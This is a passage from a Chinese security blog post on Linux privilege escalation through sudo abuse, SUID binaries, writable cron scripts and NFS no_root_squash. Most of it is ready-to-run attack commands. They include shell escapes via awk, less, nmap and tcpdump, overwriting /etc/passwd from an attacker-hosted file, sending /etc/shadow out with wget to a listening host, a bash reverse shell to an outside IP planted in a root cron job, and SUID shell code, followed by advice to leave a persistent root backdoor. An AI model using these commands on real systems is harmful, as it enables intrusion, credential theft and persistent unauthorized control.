<h2 id="11、awk命令"><a href="#11、awk命令" class="headerlink" title="11、awk命令"></a>11、awk命令</h2><p>akw命令进入shell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="12、nano命令"><a href="#12、nano命令" class="headerlink" title="12、nano命令"></a>12、nano命令</h2><p>nano也算是比较上古的文本编辑器了，nano进入shell的方法为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nano <span class="comment">#进入nano编辑器 Ctrl + R</span></span><br><span class="line">Ctrl + X</span><br><span class="line"><span class="comment">#即可输入命令</span></span><br></pre></td></tr></table></figure>

<h2 id="13、wget命令"><a href="#13、wget命令" class="headerlink" title="13、wget命令"></a>13、wget命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这种非常酷的方式要求Web服务器下载文件。这样我从没在任何地方见过。让我们解释一下。</span><br><span class="line">首先将Target的/etc/passwd文件复制到攻击者计算机。 修改文件，并在上一步中保存的密码文件中添加用户到攻击者计算机。 仅附加此行=&gt;</span><br><span class="line">touhid:<span class="variable">$6</span><span class="variable">$bxwJfzor</span><span class="variable">$MUhUWO0MUgdkWfPPEydqgZpm</span>.YtPMI/gaM4lVqhP21LFNWmSJ8 <span class="number">21</span>kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0/<span class="number">0</span>:b:root/root:</span><br><span class="line">将passwd文件托管到使用任何Web服务器的主机。</span><br><span class="line">在受害者方面。</span><br><span class="line">sudo <span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.1</span>:<span class="number">8080</span>/passwd <span class="literal">-O</span> /etc/passwd</span><br><span class="line">现在切换用户密码是:test</span><br><span class="line">su touhid</span><br><span class="line">注意:如果您要从服务器上转储文件，例如 root 的 ssh 密钥， shadow 文件等。 sudo <span class="built_in">wget</span> —post<span class="operator">-file</span> = /etc/shadow <span class="number">192.168</span>.<span class="number">56.1</span>:<span class="number">8080</span> 攻击者的设置侦听器:nc –lvp <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<h2 id="14、zip提权"><a href="#14、zip提权" class="headerlink" title="14、zip提权"></a>14、zip提权</h2><p>首先，我们使用touch命令创建一个文件，我们已创建了一个raj.txt文件，现在我们通过zip文件压缩 raj.txt文件，并执行一个获取shell的命令。如下:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zip <span class="number">1</span>.zip raj.txt <span class="literal">-T</span> <span class="literal">--unzip-command</span>=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，我们已经通过zip命令成功获取到了受害者机器的shell。<br><img src="https://img-blog.csdnimg.cn/22581212eb0948e593be27ccfcadb5c9.png" alt="在这里插入图片描述"></p>
<h1 id="三、suid提权"><a href="#三、suid提权" class="headerlink" title="三、suid提权"></a>三、suid提权</h1><p>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行 root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限 , 简单来说就是 文件的拥有者是root , 然后这个文件又可以通过某语法执行系统命令 , 那么你就可以提升到root权限了<br>##		1、寻找suid文件<br>在Linux中查找可以用来提权的suid文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/表示从文件系统的顶部(根)开始并找到每个目录</span><br><span class="line"><span class="literal">-perm</span> 表示搜索随后的权限 <span class="literal">-u</span> = s表示查找root用户拥有的文件</span><br><span class="line"><span class="literal">-type</span> 表示我们正在寻找的文件类型 f 表示常规文件，而不是目录或特殊文件 <span class="number">2</span>表示该进程的第二个文件描述符，即stderr(标准错误)</span><br><span class="line">&gt;表示重定向 /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br><span class="line">另外两个相同的查找命令</span><br><span class="line">find / <span class="literal">-user</span> root <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="literal">-print</span> <span class="number">2</span>&gt;/dev/null find / <span class="literal">-user</span> root <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="literal">-exec</span> <span class="built_in">ls</span> <span class="literal">-ldb</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>跟滥用sudo的原理差不多 , 也是列举几个常见的命令 , SUID提权和SUDO提权是通用的<br>##		2、find命令<br>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用 SUID权限运行，则可以通过find执行的命令都将以root身份去运行。<br>提权如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch anyfile(文件路径) <span class="comment">#必须要有这个文件 </span></span><br><span class="line">find anyfile <span class="literal">-exec</span> whoami \;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4d9f0a70914d4f2fb8f6bad3c11df034.png" alt="在这里插入图片描述"></p>
<h2 id="3、vin-x2F-vim命令"><a href="#3、vin-x2F-vim命令" class="headerlink" title="3、vin&#x2F;vim命令"></a>3、vin&#x2F;vim命令</h2><p><img src="https://img-blog.csdnimg.cn/9e281f5c0f1949e38093e3fb45ec855f.png" alt="在这里插入图片描述"></p>
<h2 id="4、bash命令"><a href="#4、bash命令" class="headerlink" title="4、bash命令"></a>4、bash命令</h2><p>以下命令将以root身份打开一个bash shell。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bash <span class="literal">-p</span></span><br><span class="line">bash<span class="literal">-3</span>.<span class="number">2</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">1002</span>(service) gid=<span class="number">1002</span>(service) euid=<span class="number">0</span>(root) groups=<span class="number">1002</span>(service)</span><br></pre></td></tr></table></figure>

<h2 id="5、more-x2F-less命令"><a href="#5、more-x2F-less命令" class="headerlink" title="5、more&#x2F;less命令"></a>5、more&#x2F;less命令</h2><p><strong>less命令也可以进入shell</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"><span class="comment">#在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
<p><strong>more命令进入shell和less相同</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/passwd</span><br><span class="line"><span class="comment">#在more中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<h2 id="6、nano命令"><a href="#6、nano命令" class="headerlink" title="6、nano命令"></a>6、nano命令</h2><p>nano进入shell的方法为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nano <span class="comment">#进入nano编辑器 Ctrl + R</span></span><br><span class="line">Ctrl + X</span><br><span class="line"><span class="comment">#即可输入命令</span></span><br></pre></td></tr></table></figure>

<h2 id="7、mv-x2F-cp命令"><a href="#7、mv-x2F-cp命令" class="headerlink" title="7、mv&#x2F;cp命令"></a>7、mv&#x2F;cp命令</h2><p>使用 mv&#x2F;cp 命令覆盖原来的 &#x2F;etc&#x2F;passwd 文件<br>##		8、awk命令<br>awk命令进入shell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/faa6d8eaf2114544ae095c38204eda92.png" alt="在这里插入图片描述"></p>
<h2 id="9、nmap命令"><a href="#9、nmap命令" class="headerlink" title="9、nmap命令"></a>9、nmap命令</h2><p>nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受 影响的范围内或更早就可以尝试使用这种方法进行提权</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-v</span> <span class="comment">#查看版本</span></span><br><span class="line">nmap <span class="literal">--interactive</span> <span class="comment"># 进入交互模式</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进入shell</span><br><span class="line">nmap&gt; !sh</span><br><span class="line"> sh<span class="literal">-3</span>.<span class="number">2</span><span class="comment"># whoami</span></span><br><span class="line">  root</span><br></pre></td></tr></table></figure>

<h2 id="10、man命令"><a href="#10、man命令" class="headerlink" title="10、man命令"></a>10、man命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">man</span> passwd </span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="11、tcpdump命令"><a href="#11、tcpdump命令" class="headerlink" title="11、tcpdump命令"></a>11、tcpdump命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$</span><span class="string">&#x27;id\ncat /etc/shadow&#x27;</span> &gt; /tmp/.test</span><br><span class="line">chmod +x /tmp/.test</span><br><span class="line">sudo tcpdump <span class="literal">-ln</span> <span class="literal">-i</span> eth0 <span class="literal">-w</span> /dev/null <span class="literal">-W</span> <span class="number">1</span> <span class="literal">-G</span> <span class="number">1</span> <span class="literal">-z</span> /tmp/.test <span class="literal">-Z</span> root</span><br></pre></td></tr></table></figure>

<h2 id="12、python-x2F-per-x2F-ruby-x2F-lua-x2F-php-x2F-etc命令"><a href="#12、python-x2F-per-x2F-ruby-x2F-lua-x2F-php-x2F-etc命令" class="headerlink" title="12、python&#x2F;per&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令"></a>12、python&#x2F;per&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># perl</span></span><br><span class="line">exec <span class="string">&quot;/bin/bash&quot;</span>;</span><br></pre></td></tr></table></figure>

<h1 id="四、计划任务提权"><a href="#四、计划任务提权" class="headerlink" title="四、计划任务提权"></a>四、计划任务提权</h1><p>如果可以 找到可以有权限修改的计划任务脚本，就可以修改脚本实现提权 。本质上，就是文件权限配置不当 查看计划任务，找到有修改权限的计划任务脚本 , 在计划任务对应中追加提权后门</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/crontab</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/618be892b38a45e09afa029fa64caa19.png" alt="在这里插入图片描述"><br>在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root权限下</span><br><span class="line">vim /tmp/test.sh</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ping qq.com <span class="literal">-c</span> <span class="number">4</span></span><br><span class="line">vim /etc/crontab</span><br><span class="line">*/<span class="number">1</span> * * * * root /bin/bash /tmp/test.sh</span><br><span class="line">chmod <span class="number">777</span> /tmp/test.sh</span><br><span class="line">vim /tmp/test.sh</span><br><span class="line">/bin/bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">0.96</span>/<span class="number">5656</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h1 id="五、第三方服务NFS提权"><a href="#五、第三方服务NFS提权" class="headerlink" title="五、第三方服务NFS提权"></a>五、第三方服务NFS提权</h1><h2 id="1、什么是NFS"><a href="#1、什么是NFS" class="headerlink" title="1、什么是NFS"></a>1、什么是NFS</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网络文件系统(NFS )是一个客户端/服务器应用程序 ，它使计算机用户可以查看和选择存储和更新远 程计算机上的文件，就像它们位于用户自己的计算机上一样。在NFS协议是几个分布式文件系统标准， 网络附加存储(NAS)之一。</span><br><span class="line">NFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、 操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无 关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支 持在异构系统之间数据的传送。</span><br></pre></td></tr></table></figure>

<h2 id="2、什么是root-sqaush和no-root-sqaush"><a href="#2、什么是root-sqaush和no-root-sqaush" class="headerlink" title="2、什么是root_sqaush和no_root_sqaush"></a>2、什么是root_sqaush和no_root_sqaush</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Root Squashing(root_sqaush)参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程 根用户在连接时会分配一个用户 <span class="string">&quot;nfsnobody&quot;</span>，它具有最少的本地特权。如果no_root_squash选项开 启的话，并为远程用户授予root用户对所连接系统的访问权限 , 即攻击者用本地root用户链接 , 在目标 系统操作的权限也是root权限</span><br><span class="line">注意:要利用此，no_root_squash选项得开启。</span><br><span class="line">root_squash:客户机用root用户访问该共享文件夹时，将root用户映射成匿名用户(默认设置); no_root_squash:客户机用root访问该共享文件夹时，不映射root用户为匿名用户 , 依然是root用 户;</span><br></pre></td></tr></table></figure>

<h2 id="3、利用NFS提权"><a href="#3、利用NFS提权" class="headerlink" title="3、利用NFS提权"></a>3、利用NFS提权</h2><p>首先拿到一个低权限的shell，查看目标服务器上是否开启了NFS</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/exports <span class="comment"># 如果啥也没有就是没有开启nfs,也就无法提权了</span></span><br></pre></td></tr></table></figure>
<p><strong>实验靶机 centos7配置nfs</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install <span class="literal">-y</span> nfs<span class="literal">-utils</span></span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">systemctl <span class="built_in">start</span> rpcbind.service systemctl <span class="built_in">start</span> nfs<span class="literal">-server</span>.service</span><br><span class="line"><span class="comment"># 设置开机自动启动</span></span><br><span class="line">systemctl enable rpcbind.service</span><br><span class="line">systemctl enable nfs<span class="literal">-server</span>.service</span><br><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vim /etc/exports</span><br><span class="line">/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check) <span class="comment"># 使配置生效</span></span><br><span class="line">exportfs <span class="literal">-a</span></span><br><span class="line"><span class="comment"># 查看共享目录</span></span><br><span class="line">showmount <span class="literal">-e</span></span><br><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line"><span class="comment"># 查看服务</span></span><br><span class="line">systemctl status rpcbind.service systemctl status nfs<span class="literal">-server</span>.service</span><br></pre></td></tr></table></figure>
<p><strong>此时查看nfs配置</strong><br><img src="https://img-blog.csdnimg.cn/ed3b2d1665074cd5bbfd8d50abab505f.png" alt="在这里插入图片描述"><br>&#x2F;etc&#x2F;exports 文件包含将哪些文件夹&#x2F;文件系统导出到远程用户的配置和权限。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构成: [共享的目录] [主机名或<span class="type">IP</span>(参数,参数)] , 其中参数是可选的，当不指定参数时，nfs将使用默认选项。 默认的共享选项是 sync,ro,root_squash,no_delay。当主机名或IP地址为空或者*时，则代表共享给任 意客户机提供服务。当将同一目录共享给多个客户机，但对每个客户机提供的权限不同时，可以这样: [共享的目录] [主机名<span class="number">1</span>或<span class="type">IP1</span>(参数<span class="number">1</span>,参数<span class="number">2</span>)] [主机名<span class="number">2</span>或<span class="type">IP2</span>(参数<span class="number">3</span>,参数<span class="number">4</span>)]</span><br></pre></td></tr></table></figure>
<p>很简单就是当nfs配置了no_root_squash，客户端就具有了这台nfs机器的root权限，即其他机器链接他的话是一个root权限：<br>1、查看NFS服务器上的共享目录，kali上操作</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount <span class="literal">-e</span> <span class="number">192.168</span>.<span class="number">0.84</span> 目标ip</span><br></pre></td></tr></table></figure>
<p>2、创建本地挂载目录，挂载共享目录，使用攻击者本地root权限创建suid shell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="literal">-p</span> /tmp/test</span><br><span class="line"><span class="built_in">mount</span> <span class="literal">-t</span> nfs <span class="number">192.168</span>.<span class="number">0.84</span>:/tmp /tmp/test</span><br><span class="line">vim /tmp/test/suid<span class="literal">-shell</span>.c <span class="comment"># 内容如下</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int main() &#123; setuid(<span class="number">0</span>); system(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc /tmp/test/suid<span class="literal">-shell</span>.c <span class="literal">-o</span> /tmp/test/suid<span class="literal">-shell</span> chmod +s /tmp/test/suid<span class="literal">-shell</span></span><br></pre></td></tr></table></figure>
<p>3、回到要提权的服务器上，使用普通用户获取root权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow <span class="comment"># 证明没权限 /tmp/suid-shell</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow <span class="comment"># 证明有权限 , 提权成功</span></span><br><span class="line"><span class="comment"># 然后 ( 一般先上线cs , 或者留个root权限的后门 , 总之就是能持续控制)</span></span><br><span class="line"><span class="comment"># root权限后门留好 , 取消挂载</span></span><br><span class="line">sudo umount /tmp/test</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/8038bfffc9f342ac865fc1c87838aa17.png" alt="在这里插入图片描述"></p>
<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.系统内核漏洞提权 , 脏牛提权</span><br><span class="line"><span class="number">2</span>.sudo 命令滥用提权 , 查看有那些不需要密码就可以执行的sudo命令 , 比如 find , git等 可以用来提权 <span class="number">3</span>.suid提权 , 寻找带有s属性 , 又可以执行命令的可执行文件</span><br><span class="line"><span class="number">4</span>.计划任务提权 , 通过寻找可以修改计划任务的脚本</span><br><span class="line"><span class="number">5</span>.第三方服务配置不当提权 , 比如 nfs 配置不当提权</span><br><span class="line"><span class="number">6</span>.udf提权 , 利用mysql数据库进行提权</span><br><span class="line"><span class="number">7</span>.复现过影响范围比较广的提权漏洞 , 如 sudo提权 pkexec提权 , 脏管道提权</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://maxenton-pym.top">Maxenton</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://maxenton-pym.top/2022/05/01/linux_sudo/">https://maxenton-pym.top/2022/05/01/linux_sudo/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://maxenton-pym.top" target="_blank">Maxenton</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/">安全知识</a></div><div class="post_share"><div class="social-share" data-image="/img/getshell.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/05/04/msf_study_two/"><img class="prev-cover" src="/img/MSF01.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MSF初体验（二）</div></div></a></div><div class="next-post pull-right"><a href="/2022/04/30/msf_study_one/"><img class="next-cover" src="/img/MSF01.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MSF初体验（一）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/12/13/do_not_kill/" title="免杀"><img class="cover" src="/img/miansha.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">免杀</div></div></a></div><div><a href="/2021/09/19/framework_study_one/" title="框架-中间件多学习（一）"><img class="cover" src="/img/mid.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-19</div><div class="title">框架-中间件多学习（一）</div></div></a></div><div><a href="/2021/10/08/framework_study_two/" title="框架-中间件多学习（二）"><img class="cover" src="/img/mid.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-08</div><div class="title">框架-中间件多学习（二）</div></div></a></div><div><a href="/2021/11/10/pocsuite3_study/" title="初始PocSuite3框架"><img class="cover" src="/img/poc.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-10</div><div class="title">初始PocSuite3框架</div></div></a></div><div><a href="/2021/12/13/web_getshell_func/" title="免杀"><img class="cover" src="/img/getshell.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">免杀</div></div></a></div><div><a href="/2022/09/14/Business_logic/" title="业务逻辑漏洞的学习"><img class="cover" src="/img/yewu.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-14</div><div class="title">业务逻辑漏洞的学习</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Maxenton</div><div class="author-info__description">一个啥都只会一点的白帽子</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">39</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_15131581?spm=1030.2200.3001.5343"><i class="fab fa-cuttlefish"></i><span>CSDN欢迎关注</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/threeshui" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:peiyimiao@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_15131581?spm=1030.2200.3001.5343" target="_blank" title=""><i class="fab fa-cuttlefish"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到这里，愿君所遇即所爱！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">一、内核漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%B8%B8%E8%A7%84%E6%9F%A5%E6%89%BE"><span class="toc-text">1、常规查找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81Ubuntu-16-04%E6%8F%90%E6%9D%83"><span class="toc-text">2、Ubuntu 16.04提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-text">3、脏牛提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BB%A5%E7%94%A8sudo%E6%8F%90%E6%9D%83"><span class="toc-text">二、滥用sudo提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFsudo"><span class="toc-text">1、什么是sudo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81sudoer%E6%96%87%E4%BB%B6%E8%AF%AD%E6%B3%95"><span class="toc-text">2、sudoer文件语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%A9%E7%94%A8sudo%E6%8F%90%E6%9D%83"><span class="toc-text">3、利用sudo提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81find%E5%91%BD%E4%BB%A4"><span class="toc-text">4、find命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81vim%E5%91%BD%E4%BB%A4"><span class="toc-text">5、vim命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81nmap%E5%91%BD%E4%BB%A4"><span class="toc-text">6、nmap命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81git%E5%91%BD%E4%BB%A4"><span class="toc-text">7、git命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81teehee%E5%91%BD%E4%BB%A4"><span class="toc-text">8、teehee命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81man%E5%91%BD%E4%BB%A4"><span 